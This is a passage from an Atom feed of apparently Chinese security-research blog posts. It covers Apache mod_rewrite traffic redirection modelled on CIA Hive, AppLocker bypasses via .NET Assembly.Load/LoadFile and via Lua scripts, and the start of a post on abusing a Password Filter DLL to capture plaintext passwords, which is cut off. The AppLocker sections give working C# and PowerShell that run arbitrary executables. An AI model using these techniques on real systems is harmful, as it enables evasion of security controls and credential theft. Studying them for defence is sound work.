    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>2017年11月9日维基解密公布一个代号为Vault8的文档，包含服务器远程控制工具Hive的源代码和开发文档。开发文档中的框架图显示Hive支持流量分发功能，若流量有效，转发至Honeycomb服务器，若流量存在问题，转发至Cover Server。<br>本文仅站在技术研究的角度，尝试使用Apache的mod_rewrite模块实现http流量分发，完成相同的目标。</p><p>标记后的框架图如下：</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/0.png" alt="Alt text"></p><p>之前的分析文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%BA%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《CIA Hive测试指南——源代码获取与简要分析》</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>Windows系统下安装配置Apache mod_rewrite</li><li>Ubuntu系统下安装配置Apache mod_rewrite</li><li>规则配置技巧与实例</li><li>根据判定条件实现http流量分发</li></ul><h2 id="0x02-Windows系统下安装配置Apache-mod-rewrite"><a href="#0x02-Windows系统下安装配置Apache-mod-rewrite" class="headerlink" title="0x02 Windows系统下安装配置Apache mod_rewrite"></a>0x02 Windows系统下安装配置Apache mod_rewrite</h2><hr><h3 id="1、下载Apache"><a href="#1、下载Apache" class="headerlink" title="1、下载Apache"></a>1、下载Apache</h3><p>地址：</p><p><a href="http://httpd.apache.org/download.cgi" target="_blank" rel="noopener">http://httpd.apache.org/download.cgi</a></p><p>选择需要的版本，测试版本Apache 2.4.33，下载地址：</p><p><a href="https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW</a></p><h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><p>解压后通过命令行安装：</p><pre><code>cd \Apace24\binhttpd -k install</code></pre><h3 id="3、开启mod-rewrite模块"><a href="#3、开启mod-rewrite模块" class="headerlink" title="3、开启mod_rewrite模块"></a>3、开启mod_rewrite模块</h3><p>编辑文件： <code>\Apace24\conf\httpd.conf</code></p><p>找到<code>#LoadModule rewrite_module modules/mod_rewrite.so</code>，去掉<code>#</code></p><h3 id="4、开启支持-htaccess文件"><a href="#4、开启支持-htaccess文件" class="headerlink" title="4、开启支持.htaccess文件"></a>4、开启支持.htaccess文件</h3><p>编辑文件： <code>\Apace24\conf\httpd.conf</code></p><p>定位如下位置：</p><pre><code>DocumentRoot &quot;${SRVROOT}/htdocs&quot;&lt;Directory &quot;${SRVROOT}/htdocs&quot;&gt;    #    # Possible values for the Options directive are &quot;None&quot;, &quot;All&quot;,    # or any combination of:    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews    #    # Note that &quot;MultiViews&quot; must be named *explicitly* --- &quot;Options All&quot;    # doesn&#39;t give it to you.    #    # The Options directive is both complicated and important.  Please see    # http://httpd.apache.org/docs/2.4/mod/core.html#options    # for more information.    #    Options Indexes FollowSymLinks    #    # AllowOverride controls what directives may be placed in .htaccess files.    # It can be &quot;All&quot;, &quot;None&quot;, or any combination of the keywords:    #   Options FileInfo AuthConfig Limit    #    AllowOverride All    #    # Controls who can get stuff from this server.    #    Require all granted&lt;/Directory&gt;</code></pre><p><code>AllowOverride None</code>改为<code>AllowOverride All</code></p><h3 id="5、编写-htaccess文件，配置规则"><a href="#5、编写-htaccess文件，配置规则" class="headerlink" title="5、编写.htaccess文件，配置规则"></a>5、编写.htaccess文件，配置规则</h3><p>保存路径为<code>\Apace24\htdocs\</code></p><p>测试规则为将1.html重定向到2.html，具体内容如下：</p><pre><code>&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteRule 1.html 2.html&lt;/IfModule&gt;</code></pre><p>使用记事本打开，另存为文件，文件名为<code>&quot;.htaccess&quot;</code></p><p><strong>注：</strong></p><p>文件名包含引号<code>&quot;</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/2-1.png" alt="Alt text"></p><p>2.html保存在<code>\Apace24\htdocs\</code>，内容如下：</p><pre><code>&lt;html&gt;&lt;body&gt;True page&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6、开启apache服务"><a href="#6、开启apache服务" class="headerlink" title="6、开启apache服务"></a>6、开启apache服务</h3><pre><code>httpd.exe -k start</code></pre><h3 id="7、测试"><a href="#7、测试" class="headerlink" title="7、测试"></a>7、测试</h3><p>访问<code>http://127.0.0.1/1.html</code></p><p>返回内容<code>True page</code>，代表网页被重定向到了2.html</p><h3 id="8、补充"><a href="#8、补充" class="headerlink" title="8、补充"></a>8、补充</h3><p>apache的日志路径为<code>\Apache24\logs</code></p><p>mod_rewrite的日志保存在<code>error.log</code></p><p>文件<code>\Apace24\conf\httpd.conf</code>可指定日志记录等级</p><h2 id="0x03-Ubuntu系统下安装配置Apache-mod-rewrite"><a href="#0x03-Ubuntu系统下安装配置Apache-mod-rewrite" class="headerlink" title="0x03 Ubuntu系统下安装配置Apache mod_rewrite"></a>0x03 Ubuntu系统下安装配置Apache mod_rewrite</h2><hr><h3 id="1、下载安装"><a href="#1、下载安装" class="headerlink" title="1、下载安装"></a>1、下载安装</h3><pre><code>sudo apt-get install apache2</code></pre><h3 id="2、开启mod-rewrite模块"><a href="#2、开启mod-rewrite模块" class="headerlink" title="2、开启mod_rewrite模块"></a>2、开启mod_rewrite模块</h3><pre><code>sudo a2enmod rewrite</code></pre><h3 id="3、开启支持-htaccess文件"><a href="#3、开启支持-htaccess文件" class="headerlink" title="3、开启支持.htaccess文件"></a>3、开启支持.htaccess文件</h3><p>编辑文件： <code>/etc/apache2/apache2.conf</code></p><p>定位如下位置：</p><pre><code>&lt;Directory /var/www/&gt;        Options Indexes FollowSymLinks        AllowOverride None        Require all granted&lt;/Directory&gt;</code></pre><p><code>AllowOverride None</code>改为<code>AllowOverride All</code></p><h3 id="4、编写-htaccess文件，配置规则"><a href="#4、编写-htaccess文件，配置规则" class="headerlink" title="4、编写.htaccess文件，配置规则"></a>4、编写.htaccess文件，配置规则</h3><p>保存路径为<code>\var\www\html\</code></p><p>测试规则为将1.html重定向到2.html，具体内容如下：</p><pre><code>&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteRule 1.html 2.html&lt;/IfModule&gt;</code></pre><p>2.html保存在<code>\var\www\html\</code>，内容如下：</p><pre><code>&lt;html&gt;&lt;body&gt;True page&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="5、开启apache服务"><a href="#5、开启apache服务" class="headerlink" title="5、开启apache服务"></a>5、开启apache服务</h3><pre><code>sudo /etc/init.d/apache2 restart</code></pre><h3 id="6、测试"><a href="#6、测试" class="headerlink" title="6、测试"></a>6、测试</h3><p>访问<code>http:/IP/1.html</code></p><p>返回内容<code>True page</code>，代表网页被重定向到了2.html</p><h3 id="7、补充"><a href="#7、补充" class="headerlink" title="7、补充"></a>7、补充</h3><p>apache的日志路径为<code>/var/log/apache2/</code></p><p>mod_rewrite的日志保存在error.log</p><p>文件<code>/etc/apache2/apache2.conf</code>可指定日志记录等级</p><h2 id="0x04-规则配置技巧与实例"><a href="#0x04-规则配置技巧与实例" class="headerlink" title="0x04 规则配置技巧与实例"></a>0x04 规则配置技巧与实例</h2><hr><h3 id="1、将所有网页重定向至-https-www-baidu-com"><a href="#1、将所有网页重定向至-https-www-baidu-com" class="headerlink" title="1、将所有网页重定向至 https://www.baidu.com"></a>1、将所有网页重定向至 <code>https://www.baidu.com</code></h3><p>.htaccess文件内容如下：</p><pre><code>&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteRule . https://www.baidu.com&lt;/IfModule&gt;</code></pre><h3 id="2、过滤Request-Header"><a href="#2、过滤Request-Header" class="headerlink" title="2、过滤Request Header"></a>2、过滤Request Header</h3><h4 id="1-User-Agent"><a href="#1-User-Agent" class="headerlink" title="(1) User Agent"></a>(1) User Agent</h4><p>只针对特定User Agent的请求进行重定向</p><p><strong>实例：</strong></p><p>使用Mac下的Safari浏览器访问1.html，将其重定向到2.html</p><p>.htaccess文件内容如下：</p><pre><code>&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond &quot;%{HTTP_USER_AGENT}&quot; &quot;Macintosh; Intel Mac OS X 10_9_3&quot; [NC]RewriteRule 1.html 2.html&lt;/IfModule&gt;</code></pre><p>参数说明：</p><p><code>RewriteCond &quot;%{HTTP_USER_AGENT}&quot; &quot;Macintosh; Intel Mac OS X 10_9_3&quot; [NC]</code>代表判定条件，判断<code>HTTP_USER_AGENT</code>是否包含字符串<code>&quot;Macintosh; Intel Mac OS X 10_9_3&quot;</code>(大小写不敏感)</p><p>NC: 字符比较，大小写不敏感</p><p>详细参数说明可参考：</p><p><a href="https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond</a></p><p><strong>1.使用curl进行测试</strong></p><p>模拟Chrome浏览器：</p><pre><code>curl -A &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot; http://192.168.62.137/1.html</code></pre><p>并没重定向，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-1.png" alt="Alt text"></p><p>模拟Mac Safari浏览器：</p><pre><code>curl -A &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot; http://192.168.62.137/1.html</code></pre><p>网页重定向，获得2.html的内容，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-2.png" alt="Alt text"></p><p><strong>2.Chrome浏览器修改User Agent的方法</strong></p><p>访问页面，<code>F12</code> -&gt; <code>More tools</code> -&gt; <code>Network conditions</code>，选择User agent 为 <code>Safari —— Mac</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-3.png" alt="Alt text"></p><p>####(2) Peferer</p><p>只针对特定来源的请求进行重定向</p><p><strong>实例：</strong></p><p>如果来源为test.com，访问1.html时将其重定向到2.html</p><pre><code>&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond &quot;%{HTTP_REFERER}&quot; &quot;test.com&quot; [NC]RewriteRule 1.html 2.html&lt;/IfModule&gt;</code></pre><p>使用curl进行测试：</p><pre><code>curl -e &quot;test.com&quot; http://192.168.62.137/1.html</code></pre><h4 id="3-其他可供选择的过滤条件"><a href="#3-其他可供选择的过滤条件" class="headerlink" title="(3) 其他可供选择的过滤条件"></a>(3) 其他可供选择的过滤条件</h4><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>图片来源于<a href="https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond</a></p><p><strong>补充：</strong></p><p>Jeff Dimmock在他的博客分享了使用mod_rewrite配置规则的心得，值得学习，地址如下：</p><p><a href="https://bluescreenofjeff.com/tags" target="_blank" rel="noopener">https://bluescreenofjeff.com/tags</a></p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr><p>本文介绍了Windows系统和Ubuntu系统下安装配置Apache mod_rewrite的方法，分享配置技巧与实例，在技术研究的角度实现了根据请求条件进行http流量分发。</p><p>下篇文章将要介绍https的流量分发实现。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用Assembly Load &amp; LoadFile绕过Applocker的分析总结</title>
    <link href="wiki.cfyqy.com/posts/a99095d9.html"/>
    <id>wiki.cfyqy.com/posts/a99095d9.html</id>
    <published>2018-05-25T13:03:44.924Z</published>
    <updated>2018-05-25T13:04:28.161Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>最近bohops在文章<a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/" target="_blank" rel="noopener">《Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts》</a>中介绍了利用CL_LoadAssembly.ps1绕过Applocker的方法，Casey Smith早在SchmooCon 2015也提到了这个方法。本文将要对他们的两个实现方法进行复现，分析细节，比较区别，进而总结利用思路。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>复现bohops的方法</li><li>复现Casey Smith的方法</li><li>细节分析</li><li>总结利用思路</li></ul><h2 id="0x02-复现bohops的方法"><a href="#0x02-复现bohops的方法" class="headerlink" title="0x02 复现bohops的方法"></a>0x02 复现bohops的方法</h2><hr><p>测试系统： Win7 x86</p><p>开启Applocker，开启方法可参考文章《Bypass Windows AppLocker》</p><p>开发工具: VS2012</p><p>1、新建c#控制台工程ConsoleApplication5，默认代码如下：</p><pre><code>using System;using System.Collections.Generic;using System.Text;namespace ConsoleApplication5{    class Program    {        static void Main(string[] args)        {        }    }}</code></pre><p>2、修改代码，内容如下：</p><pre><code>namespace ConsoleApplication5{    public class Program    {        public static void test()        {            System.Diagnostics.Process p = new System.Diagnostics.Process();            p.StartInfo.FileName = &quot;c:\\windows\\system32\\calc.exe&quot;;//            p.StartInfo.FileName = &quot;c:\\windows\\system32\\cmd.exe&quot;;//            p.StartInfo.Arguments = @&quot;/c &quot;&quot;powershell.exe&quot;&quot; -ep bypass -c $host&quot;;               p.Start();        }        static void Main(string[] args)        {            test();        }    }}</code></pre><p><strong>注：</strong></p><p><code>class Program</code>前需要添加访问修饰符<code>public</code>,添加Method test()同样要加访问修饰符<code>public</code></p><p>3、修改目标框架为.net 2.0，编译生成ConsoleApplication5，保存在c:\6下</p><p>4、powershell执行如下代码：</p><pre><code>cd C:\windows\diagnostics\system\AEROimport-module .\CL_LoadAssembly.ps1LoadAssemblyFromPath ..\..\..\..\6\ConsoleApplication5.exe[ConsoleApplication5.Program]::test()</code></pre><p><strong>注：</strong></p><p><code>..\..\..\..\</code>能够定位到<code>c:\</code></p><p><code>[ConsoleApplication5.Program]::test()</code>需要同程序内的代码对应，格式为：<code>[$namespace.$class]::$fuction()</code></p><p>成功执行calc.exe，绕过applocker</p><h2 id="0x03-复现Casey-Smith的方法"><a href="#0x03-复现Casey-Smith的方法" class="headerlink" title="0x03 复现Casey Smith的方法"></a>0x03 复现Casey Smith的方法</h2><hr><p>测试系统： Win7 x86</p><p>开启Applocker</p><p>代码参考地址：</p><p><a href="https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663" target="_blank" rel="noopener">https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663</a></p><p>本次测试对Casey Smith的代码做细微修改</p><p>1、新建文件bypass.cs，内容如下：</p><pre><code>using System;using System.Collections.Generic;using System.Text;public class Program{    public static void Main()    {        Console.WriteLine(&quot;Hey There From Main()&quot;);        //Add any behaviour here to throw off sandbox execution/analysts :)    }}public class aaa {        public static void bbb()        {            System.Diagnostics.Process p = new System.Diagnostics.Process();            p.StartInfo.FileName = &quot;c:\\windows\\system32\\calc.exe&quot;;//            p.StartInfo.FileName = &quot;c:\\windows\\system32\\cmd.exe&quot;;//            p.StartInfo.Arguments = @&quot;/c &quot;&quot;powershell.exe&quot;&quot; -ep bypass -c notepad.exe&quot;;               p.Start();        }}</code></pre><p>2、使用2.0版本的csc.exe对其编译，生成exe文件</p><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:bypass.exe bypass.cs</code></pre><p>3、powershell执行如下代码：</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\bypass.exe&quot;)[Reflection.Assembly]::Load($bytes)[aaa]::bbb()</code></pre><p>成功执行calc.exe，绕过applocker</p><h2 id="0x04-对比分析"><a href="#0x04-对比分析" class="headerlink" title="0x04 对比分析"></a>0x04 对比分析</h2><hr><h3 id="1、bohops的方法"><a href="#1、bohops的方法" class="headerlink" title="1、bohops的方法"></a>1、bohops的方法</h3><p>加载文件CL_LoadAssembly.ps1，位于<code>C:\windows\diagnostics\system\AERO</code></p><p>文件CL_LoadAssembly.ps1内容如下：</p><pre><code># Copyright © 2008, Microsoft Corporation. All rights reserved.# Common library. .\CL_Utility.ps1function LoadAssemblyFromNS([string]$namespace){    if([string]::IsNullorEmpty($namespace))    {        throw &quot;Invalid namespace&quot;    }    [System.Reflection.Assembly]::LoadWithPartialName($namespace) &gt; $null}function LoadAssemblyFromPath([string]$scriptPath){    if([String]::IsNullorEmpty($scriptPath))    {        throw &quot;Invalid file path&quot;    }    $absolutePath = GetAbsolutionPath $scriptPath[System.Reflection.Assembly]::LoadFile($absolutePath) &gt; $null}</code></pre><p>调用函数<code>LoadAssemblyFromPath</code>，本质上是调用<code>[System.Reflection.Assembly]::LoadFile($absolutePath)</code></p><h3 id="2、Casey-Smith的方法"><a href="#2、Casey-Smith的方法" class="headerlink" title="2、Casey Smith的方法"></a>2、Casey Smith的方法</h3><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\bypass.exe&quot;)[Reflection.Assembly]::Load($bytes)[aaa]::bbb()</code></pre><p>调用了<code>[Reflection.Assembly]::Load($bytes)</code></p><p><strong>注：</strong></p><p><code>[Reflection.Assembly]</code>是<code>[System.Reflection.Assembly]</code>的简写</p><h3 id="3、对比"><a href="#3、对比" class="headerlink" title="3、对比"></a>3、对比</h3><p>两种方法分别使用了Assembly的LoadFile和Load方法，两者的区别在这里的影响微乎其微</p><p>可以分别使用LoadFile和Load方法去调用以上两种方法生成的两个exe(分别由vs2012和csc.exe编译)</p><p>互换后的代码如下：</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\6\ConsoleApplication5.exe&quot;)[Reflection.Assembly]::Load($bytes)[ConsoleApplication5.Program]::test()</code></pre><pre><code>cd C:\windows\diagnostics\system\AEROimport-module .\CL_LoadAssembly.ps1LoadAssemblyFromPath ..\..\..\..\6\bypass.exe[aaa]::bbb()</code></pre><p>经过以上测试，可以推断如下两段代码等价：</p><pre><code>cd C:\windows\diagnostics\system\AEROimport-module .\CL_LoadAssembly.ps1LoadAssemblyFromPath ..\..\..\..\6\bypass.exe</code></pre><pre><code>[Reflection.Assembly]::LoadFile(&quot;C:\6\bypass.exe&quot;)</code></pre><p>依照以上推断，我们可以对Casey Smith的利用代码进行精简，最短的powershell实现代码如下：</p><pre><code>[Reflection.Assembly]::LoadFile(&quot;C:\6\bypass.exe&quot;)[aaa]::bbb()</code></pre><h3 id="4、适用条件"><a href="#4、适用条件" class="headerlink" title="4、适用条件"></a>4、适用条件</h3><p>实际测试，以上两种方法适用.net 2.0，如果换成.net 4.0编译，在执行时会报错</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr><p>本文分别对bohops和Casey Smith的方法做了测试，找到方法的本质是分别使用了Assembly的LoadFile和Load方法。经实际测试，得出该方法只适用于.Net 2.0环境</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用LUA脚本绕过Applocker的测试分析</title>
    <link href="wiki.cfyqy.com/posts/1b26f949.html"/>
    <id>wiki.cfyqy.com/posts/1b26f949.html</id>
    <published>2018-05-25T13:03:44.922Z</published>
    <updated>2018-05-25T13:04:28.162Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在之前的文章《Bypass Windows AppLocker》曾对绕过Applocker的方法进行过学习，而最近看到一篇文章介绍了使用LUA脚本绕过Applocker的方法，学习之后产生了以下疑问：绕过原理是什么呢？能绕过哪种AppLocker的规则呢？适用条件又是什么呢？</p><p>文章地址：</p><p><a href="https://homjxi0e.wordpress.com/2018/03/02/whitelisting-bypassing-using-lua-lanuage-wlua-com/" target="_blank" rel="noopener">https://homjxi0e.wordpress.com/2018/03/02/whitelisting-bypassing-using-lua-lanuage-wlua-com/</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>LUA脚本简介</li><li>绕过测试</li><li>绕过原理</li><li>适用条件</li><li>防御方法</li></ul><h2 id="0x02-LUA脚本简介"><a href="#0x02-LUA脚本简介" class="headerlink" title="0x02 LUA脚本简介"></a>0x02 LUA脚本简介</h2><hr><ul><li>轻量小巧的脚本语言</li><li>用标准C语言编写</li><li>可以被C/C++ 代码调用</li><li>可以调用C/C++的函数</li><li>在目前所有脚本引擎中的速度最快</li></ul><h2 id="0x03-Windows系统下执行LUA脚本"><a href="#0x03-Windows系统下执行LUA脚本" class="headerlink" title="0x03 Windows系统下执行LUA脚本"></a>0x03 Windows系统下执行LUA脚本</h2><hr><p>1、安装Lua for Windows，下载地址：</p><p><a href="http://files.luaforge.net/releases/luaforwindows/luaforwindows" target="_blank" rel="noopener">http://files.luaforge.net/releases/luaforwindows/luaforwindows</a></p><p>2、输出hello world</p><p>脚本内容：</p><pre><code>print&quot;Hello,world!&quot;</code></pre><p>cmd：</p><pre><code>lua.exe 1.txt</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-1.png" alt="Alt text"></p><p>3、调用Windows API</p><p>脚本内容：</p><pre><code>require &quot;alien&quot;MessageBox = alien.User32.MessageBoxA MessageBox:types{ret =&#39;long&#39;,abi =&#39;stdcall&#39;,&#39;long&#39;,&#39;string&#39;,&#39;string&#39;,&#39;long&#39;}MessageBox(0, &quot;title for test&quot;,&quot;LUA call windows api&quot;,0)</code></pre><p>执行如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-2.png" alt="Alt text"></p><p>4、c++执行LUA脚本</p><p>参考代码如下：</p><pre><code>extern &quot;C&quot; {  #include &quot;lua.h&quot;    #include &lt;lauxlib.h&gt;     #include &lt;lualib.h&gt;     } int main(int argc,char* argv[]){    lua_State *L =  lua_open();    luaL_openlibs(L);    luaL_dofile(L, argv[1]);    lua_close(L);    return 0;}</code></pre><p>工程需要做如下设置：</p><p>(1)修改<code>VC++ 目录</code></p><p><code>包含目录</code>，添加<code>C:\Program Files\Lua\5.1\include</code></p><p><code>库目录</code>，添加<code>C:\Program Files\Lua\5.1\lib</code></p><p>(2)<code>链接器</code> - <code>输入</code> - <code>附加依赖项</code>，添加</p><pre><code>lua5.1.liblua51.lib</code></pre><p>执行如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/3-1.png" alt="Alt text"></p><p>c++执行LUA脚本来调用Windows API，需要在同级目录添加支持文件，执行如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/3-2.png" alt="Alt text"></p><h2 id="0x04-测试使用LUA脚本绕过Applocker"><a href="#0x04-测试使用LUA脚本绕过Applocker" class="headerlink" title="0x04 测试使用LUA脚本绕过Applocker"></a>0x04 测试使用LUA脚本绕过Applocker</h2><hr><h3 id="测试一："><a href="#测试一：" class="headerlink" title="测试一："></a>测试一：</h3><p>测试系统： Win7x86</p><p>安装Lua for Windows</p><p>开启Applocker，配置默认规则</p><p>使用lua.exe执行脚本：</p><p>成功绕过Applocker的拦截</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-3.png" alt="Alt text"></p><h3 id="测试二："><a href="#测试二：" class="headerlink" title="测试二："></a>测试二：</h3><p>测试系统： Win7x86</p><p>安装Lua for Windows</p><p>开启Applocker，配置默认规则，添加规则： 拦截lua.exe</p><p>未绕过Applocker的拦截</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-4.png" alt="Alt text"></p><p><strong>注：</strong></p><p>还可以使用wlua.exe执行lua脚本</p><h3 id="测试三："><a href="#测试三：" class="headerlink" title="测试三："></a>测试三：</h3><p>测试系统： Win7x64</p><p>未安装Lua for Windows</p><p>开启Applocker，配置默认规则，系统禁止执行脚本</p><p>lua.exe同级目录放置lua5.1.dll(来自Lua for Windows安装路径)</p><p>使用lua.exe执行脚本：</p><p>未绕过Applocker的拦截</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-5.png" alt="Alt text"></p><p><strong>补充：</strong></p><p>将lua.exe换成wlua.exe，脚本内容修改为POC内容，地址如下：</p><p><a href="https://gist.githubusercontent.com/homjxi0e/fd023113bf8b1b6789afa05c3913157c/raw/6bf41cbd76e9df6d6d3edcc9e289191f898451dc/AppLockerBypassing.wlua" target="_blank" rel="noopener">https://gist.githubusercontent.com/homjxi0e/fd023113bf8b1b6789afa05c3913157c/raw/6bf41cbd76e9df6d6d3edcc9e289191f898451dc/AppLockerBypassing.wlua</a></p><p>测试结果均相同</p><h2 id="0x05-最终结论"><a href="#0x05-最终结论" class="headerlink" title="0x05 最终结论"></a>0x05 最终结论</h2><hr><p>经过以上测试，得出最终结论：</p><p>使用LUA脚本，在一定程序上能绕过Applocker，但需要满足以下条件：</p><ul><li>当前系统已安装Lua for Windows</li><li>Applocker的规则未禁止lua.exe和wlua.exe</li></ul><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文对LUA脚本的开发做了简要介绍，测试使用LUA脚本绕过Applocker的POC，得出最终结论</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Password Filter DLL在渗透测试中的应用</title>
    <link href="wiki.cfyqy.com/posts/387c4b23.html"/>
    <id>wiki.cfyqy.com/posts/387c4b23.html</id>
    <published>2018-05-25T13:03:44.920Z</published>
    <updated>2018-05-25T13:04:28.160Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在之前的文章《域渗透——Hook PasswordChangeNotify》介绍了通过dll注入Hook PasswordChangeNotify来记录新密码的方法，相当于是对API PasswordChangeNotify的利用。<br>我们知道，API PasswordChangeNotify是Password Filter DLL的一个功能函数，那么，对于Password Filter DLL本身，能否直接开发一个可供利用的DLL呢？</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>Password Filter DLL简介</li><li>利用Password Filter DLL记录明文密码</li><li>利用Password Filter DLL实现的后门</li><li>非Windows Server系统下的应用</li></ul><h2 id="0x02-Password-Filter-DLL简介"><a href="#0x02-Password-Filter-DLL简介" class="headerlink" title="0x02 Password Filter DLL简介"></a>0x02 Password Filter DLL简介</h2><hr><p>现实中使用Windows系统时，为了提高系统安全性，防止用户密码被暴力破解，系统管理员往往会对用户密码的复杂度提出要求，可通过配置组策略开启</p><p>位置如下：</p><p><code>gpedit.msc</code> -&gt; <code>本地计算机策略</code> -&gt; <code>计算机配置</code> -&gt; <code>Windows设置</code> -&gt; <code>安全设置</code> -&gt; <code>帐户策略</code> -&gt; <code>密码策略</code> -&gt; <code>密码必须符合复杂性要求</code></p><p>启用后，密码必须符合下列最低要求:</p><ul><li>不能包含用户的帐户名，不能包含用户姓名中超过两个连续字符的部分</li><li>至少有六个字符长</li><li>包含以下四类字符中的三类字符:</li><li>英文大写字母(A 